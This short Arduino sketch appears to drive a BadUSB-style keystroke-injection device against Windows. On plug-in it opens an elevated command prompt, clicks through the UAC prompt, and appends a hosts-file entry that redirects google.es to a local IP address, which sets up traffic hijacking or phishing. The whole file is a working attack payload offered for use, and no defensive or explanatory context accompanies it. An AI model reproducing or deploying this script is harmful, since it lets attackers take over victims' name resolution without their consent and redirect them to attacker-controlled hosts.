String _ORIGINALSITE = "google.es";
String _REDIRECT = "192.168.0.19";

void setup()
{
  delay(1000);
  GUI_R();
  STRING("powershell Start-Process cmd -Verb RunAs");
  ENTER();
  ALT_S();
  STRING("ECHO. >> %WINDIR%\\system32\\drivers\\etc\\hosts");
  ENTER();
  STRING("ECHO " + _REDIRECT + " " + _ORIGINALSITE + " >> %WINDIR%\\system32\\drivers\\etc\\hosts");
  ENTER();
  STRING("exit");
  ENTER();
}

